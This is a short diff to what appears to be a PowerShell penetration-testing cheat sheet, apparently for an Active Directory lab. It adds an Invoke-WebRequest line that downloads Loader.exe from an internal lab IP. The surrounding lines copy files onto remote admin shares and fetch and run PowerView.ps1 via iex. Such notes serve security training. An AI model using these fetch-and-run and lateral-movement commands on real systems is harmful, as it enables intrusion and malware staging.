@@ -185,6 +185,8 @@ Copy-Item .\script.ps1 \\<servername>\c$\'Program Files'
 echo F | xcopy path \\hostt\C$\Users\Public\file.exe
 ###Invoke-Expression
 iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
+###Invoke-WebRequest
+iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 #### Check if AppLocker configured
 ```powershell
